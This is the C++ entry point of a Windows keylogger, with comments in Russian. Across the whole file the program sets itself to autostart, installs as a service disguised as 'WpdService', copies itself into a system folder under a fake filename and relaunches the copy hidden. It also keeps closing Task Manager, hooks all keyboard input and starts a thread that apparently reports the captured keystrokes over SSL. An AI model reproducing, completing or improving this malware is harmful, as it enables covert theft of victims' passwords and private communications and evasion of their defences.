#include "keylogger.h"
#include <iostream>
#include <thread>

// Точка входа
/** @brief Точка входа. */
int main(int argc, char* argv[]) {
    ensureAutostart();
    // Режим установки
    if (argc > 1 && strcmp(argv[1], "-install") == 0) {
        installService();
        return 0;
    }

    std::thread(monitorAndCloseTaskManager).detach();

    // Проверяем расположение файла
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    std::string expectedPath = SYSTEM_HIDING_PATH + FAKE_FILENAME;


    if (strcmp(currentPath, expectedPath.c_str()) != 0) {
        std::cout << "Переносим программу в системную папку..." << std::endl;
        if (hideExecutable()) {
            std::cout << "Запускаем скрытую версию..." << std::endl;

            // Запускаем копию из системной папки
            SHELLEXECUTEINFOA sei = { 0 };
            sei.cbSize = sizeof(sei);
            sei.fMask = SEE_MASK_NOCLOSEPROCESS;
            sei.lpVerb = "open";
            sei.lpFile = expectedPath.c_str();
            sei.nShow = SW_HIDE;

            if (ShellExecuteExA(&sei)) {
                // Закрываем текущий экземпляр
                return 0;
            }
            else {
                std::cerr << "Ошибка запуска скрытой версии: " << GetLastError() << std::endl;
            }
        }

        // Если не удалось скопировать/запустить, продолжаем работу в текущем режиме
        std::cout << "Продолжаем работу в текущем режиме" << std::endl;
    }

    // Режим службы
    if (argc > 1 && strcmp(argv[1], "-service") == 0) {
        SERVICE_TABLE_ENTRY ServiceTable[] = {
            {"WpdService", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
            {NULL, NULL}
        };

        StartServiceCtrlDispatcher(ServiceTable);
    }
    else {
        // Консольный режим
        std::cout << "Кейлоггер запущен (для выхода нажмите ESC)" << std::endl;

        initSSL();

        std::thread reportThread(report);
        reportThread.detach();

        keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        UnhookWindowsHookEx(keyboardHook);
        std::cout << "Кейлоггер остановлен" << std::endl;
    }

    return 0;
}